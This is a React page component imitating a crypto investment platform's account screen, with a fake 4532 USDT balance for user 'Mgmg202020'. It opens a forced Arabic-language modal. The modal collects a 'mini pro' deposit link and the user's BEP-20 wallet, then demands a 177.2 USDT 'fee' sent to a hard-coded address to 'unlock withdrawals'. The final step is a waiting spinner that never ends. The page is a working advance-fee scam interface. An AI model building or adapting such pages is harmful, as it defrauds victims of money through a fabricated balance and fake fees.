
import React, { useState } from 'react';
import { 
  Users, 
  FileText, 
  Wallet, 
  User, 
  ClipboardList, 
  CreditCard, 
  Settings,
  ChevronRight,
  MessageCircle,
  Activity,
  Mail,
  Copy,
  Loader2
} from 'lucide-react';

const MinePage: React.FC = () => {
  const [modalStep, setModalStep] = useState<number>(1);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(true);
  const [formData, setFormData] = useState({
    miniProLink: '',
    bep20Address: ''
  });

  const nextStep = () => setModalStep(prev => prev + 1);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('تم نسخ العنوان');
  };

  return (
    <div className="relative w-full min-h-screen bg-[#F8F8F8] overflow-x-hidden">
      {/* Background Content with reduced Blur */}
      <div className={`w-full flex flex-col transition-all duration-300 ${isModalOpen ? 'blur-[3px] pointer-events-none' : ''}`}>
        {/* Header Section */}
        <div className="bg-gradient-to-b from-[#8C202C] to-[#4B3B3E] px-5 pt-10 pb-12 text-white relative">
          <div className="absolute top-8 right-5">
            <MessageCircle className="w-6 h-6 opacity-90 fill-white/10" />
          </div>

          <div className="flex items-center gap-4">
            <div className="w-[78px] h-[78px] rounded-full overflow-hidden bg-white flex items-center justify-center shadow-lg text-black">
               <svg viewBox="0 0 100 100" className="w-[85%] h-[85%]">
                  <polygon points="50,5 65,18 60,38 40,38 35,18" fill="#EB5353" />
                  <polygon points="95,50 82,65 62,60 62,40 82,35" fill="#FBC12F" />
                  <polygon points="68,92 53,85 58,65 78,65 83,85" fill="#9353BF" />
                  <polygon points="32,92 17,85 22,65 42,65 47,85" fill="#3D92C1" />
                  <polygon points="5,50 18,35 38,40 38,60 18,65" fill="#5EAF5D" />
               </svg>
            </div>
            
            <div className="flex flex-col">
              <div className="flex items-center gap-2">
                <span className="text-[21px] font-bold tracking-tight">Mgmg202020</span>
                <div className="bg-[#FFC107] text-white text-[9px] px-1.5 py-0.5 rounded-[3px] font-black italic flex items-center justify-center h-4 shadow-sm">
                  VIP 0
                </div>
              </div>
              <p className="text-[12px] opacity-80 mt-1 font-normal">Invitation code: 616535</p>
            </div>
          </div>

          <div className="mt-8 flex justify-between items-end">
            <div className="flex flex-col">
              <span className="text-[14px] font-medium mb-1 opacity-90">My Account</span>
              <div className="flex items-baseline">
                <span className="text-[12px] font-normal opacity-70 mr-2">USDT</span>
                <span className="text-[26px] font-bold leading-none">4532.1745</span>
              </div>
            </div>

            <div className="flex gap-4 mb-[-4px]">
              <button className="flex flex-col items-center gap-1.5">
                <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-md">
                  <div className="w-9 h-9 bg-[#2A66D9] rounded-xl flex items-center justify-center text-white">
                    <Wallet className="w-5 h-5" />
                  </div>
                </div>
                <span className="text-[11px] font-medium text-white/90">Deposit</span>
              </button>
              <button className="flex flex-col items-center gap-1.5">
                <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-md">
                  <div className="w-9 h-9 bg-[#2A66D9] rounded-xl flex items-center justify-center text-white">
                    <CreditCard className="w-5 h-5" />
                  </div>
                </div>
                <span className="text-[11px] font-medium text-white/90">Withdrawal</span>
              </button>
            </div>
          </div>
        </div>

        <div className="bg-white px-3 py-6 flex justify-around items-start border-b border-[#F0F0F0]">
          <FeatureItem icon={<Users className="text-[#FF9800]" />} label="Teams" />
          <FeatureItem icon={<FileText className="text-[#4DB6AC]" />} label="Record" />
          <FeatureItem icon={<Activity className="text-[#E91E63]" />} label="Wallet management" />
          <FeatureItem icon={<Mail className="text-[#2196F3]" />} label="Invite friends" />
        </div>

        <div className="mt-4 px-4">
          <div className="bg-white rounded-[14px] shadow-sm overflow-hidden border border-[#EEEEEE]">
            <MenuItem icon={<User className="text-[#BDBDBD] w-5 h-5" />} label="Profile" />
            <MenuItem icon={<ClipboardList className="text-[#BDBDBD] w-5 h-5" />} label="Deposit records" />
            <MenuItem icon={<CreditCard className="text-[#BDBDBD] w-5 h-5" />} label="Withdrawal records" />
            <MenuItem icon={<Settings className="text-[#BDBDBD] w-5 h-5" />} label="Setting" isLast />
          </div>
        </div>
      </div>

      {/* Steps Modal Overlay */}
      {isModalOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/30 backdrop-blur-[1px]">
          <div className="bg-white w-full max-w-sm rounded-[24px] shadow-2xl overflow-hidden animate-in zoom-in duration-300">
            <div className="p-6 flex flex-col items-center text-center space-y-4" dir="rtl">
              
              {/* Step 1: Welcome & Initial Instruction */}
              {modalStep === 1 && (
                <>
                  <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2">
                    <User className="w-8 h-8 text-blue-600" />
                  </div>
                  <h3 className="text-lg font-bold text-gray-800">أهلاً بك Mgmg202020</h3>
                  <p className="text-sm text-gray-600 leading-relaxed">
                    تم حل أمر المهام بنجاح. اضغط التالي وقم بوضع رابط المنصة mini pro لقسم الإيداع حصراً.
                  </p>
                  <button 
                    onClick={nextStep}
                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform"
                  >
                    التالي
                  </button>
                </>
              )}

              {/* Step 2: Mini Pro Link Input */}
              {modalStep === 2 && (
                <>
                  <h3 className="text-lg font-bold text-gray-800">رابط منصة mini pro</h3>
                  <p className="text-xs text-gray-500 mb-2">يرجى وضع رابط قسم الإيداع من المنصة</p>
                  <input 
                    type="text"
                    placeholder="ضع الرابط هنا..."
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8C202C]/20 text-right"
                    value={formData.miniProLink}
                    onChange={(e) => setFormData({...formData, miniProLink: e.target.value})}
                  />
                  <button 
                    onClick={nextStep}
                    disabled={!formData.miniProLink}
                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform disabled:opacity-50"
                  >
                    التالي
                  </button>
                </>
              )}

              {/* Step 3: BEP-20 Wallet Address Input */}
              {modalStep === 3 && (
                <>
                  <h3 className="text-lg font-bold text-gray-800">رابط محفظة BEP-20</h3>
                  <p className="text-xs text-gray-500 mb-2">يرجى إدخال عنوان المحفظة الخاص بك لسحب الأرباح</p>
                  <input 
                    type="text"
                    placeholder="0x..."
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8C202C]/20 text-left"
                    value={formData.bep20Address}
                    onChange={(e) => setFormData({...formData, bep20Address: e.target.value})}
                  />
                  <button 
                    onClick={nextStep}
                    disabled={!formData.bep20Address}
                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform disabled:opacity-50"
                  >
                    التالي
                  </button>
                </>
              )}

              {/* Step 4: Final Payment Instruction */}
              {modalStep === 4 && (
                <>
                  <div className="bg-red-50 p-4 rounded-xl border border-red-100 text-right w-full">
                    <h3 className="text-md font-bold text-red-800 mb-2">تنبيه نهائي</h3>
                    <p className="text-[13px] text-red-700 leading-relaxed">
                      أهلاً بك Mgmg202020، بقي أمر إيداع مبلغ <span className="font-bold underline">177.2 USDT BEP-20</span> لفتح قناة السحب.
                    </p>
                    <p className="text-[11px] text-gray-500 mt-2 italic">
                      هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
                    </p>
                  </div>
                  
                  <div className="w-full space-y-2 mt-4">
                    <p className="text-[10px] text-gray-400 font-medium text-right uppercase">Address (BEP20)</p>
                    <div className="flex items-center gap-2 bg-gray-100 p-3 rounded-lg border border-gray-200">
                      <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-blue-600 active:scale-90 transition-transform">
                        <Copy size={18} />
                      </button>
                      <span className="text-[10px] font-mono text-gray-600 truncate flex-1 text-left">
                        0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                      </span>
                    </div>
                  </div>

                  <button 
                    onClick={nextStep}
                    className="w-full py-3 bg-[#8C202C] text-white rounded-xl font-bold active:scale-95 transition-transform mt-4 shadow-lg shadow-[#8C202C]/20"
                  >
                    تم الإيداع
                  </button>
                </>
              )}

              {/* Step 5: Waiting Message */}
              {modalStep === 5 && (
                <div className="py-8 flex flex-col items-center">
                  <Loader2 className="w-12 h-12 text-[#8C202C] animate-spin mb-4" />
                  <h3 className="text-lg font-bold text-gray-800">الرجاء الانتظار</h3>
                  <p className="text-sm text-gray-500 mt-2">جاري التأكد من عملية الإيداع، يرجى عدم إغلاق الصفحة...</p>
                </div>
              )}

            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const FeatureItem: React.FC<{ icon: React.ReactNode, label: string }> = ({ icon, label }) => (
  <button className="flex flex-col items-center justify-start w-1/4 active:opacity-70 transition-opacity">
    <div className="w-10 h-10 flex items-center justify-center mb-1">
      {React.cloneElement(icon as React.ReactElement, { size: 36, strokeWidth: 1.5 })}
    </div>
    <span className="text-[11px] text-[#333] leading-tight text-center font-normal px-1">
      {label}
    </span>
  </button>
);

const MenuItem: React.FC<{ icon: React.ReactNode, label: string, isLast?: boolean }> = ({ icon, label, isLast }) => (
  <button className={`w-full flex items-center justify-between py-4 px-4 active:bg-gray-50 transition-colors ${!isLast ? 'border-b border-[#F9F9F9]' : ''}`}>
    <div className="flex items-center gap-3">
      <div className="w-6 flex justify-center">{icon}</div>
      <span className="text-[14px] text-[#333] font-normal">{label}</span>
    </div>
    <ChevronRight className="w-4 h-4 text-[#D0D0D0]" />
  </button>
);

export default MinePage;
